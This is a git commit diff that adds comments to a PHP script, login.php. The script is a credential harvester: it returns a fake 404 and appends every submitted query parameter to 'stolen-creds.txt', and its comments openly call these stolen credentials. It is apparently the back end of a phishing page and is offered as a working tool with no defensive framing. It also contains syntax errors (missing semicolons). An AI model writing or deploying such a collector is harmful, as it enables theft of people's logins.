92757596812262ba200e826b1e55b3ea0cd8c2c2
Ofek Vardi <ofekvar1@gmail.com>
2022-05-14 18:07:30 +0300

    Add comments to php script

--- login.php
+++ login.php
@@ -1,10 +1,13 @@
 <?php
+	// Redirect user to 404 page
 	header('HTTP/1.0 404 Not Found');
+	//Create file handle
 	$handle = fopen("stolen-creds.txt", "a")
+	// Store all stolen creds, in a 'key=value' format
 	foreach($_GET as $variable => $value) {
 		fwrite($handle, "$variable=$value\n");
-		fclose($handle);
 	}
+	// Drop handle
 	fclose($handle)
 ?>
 
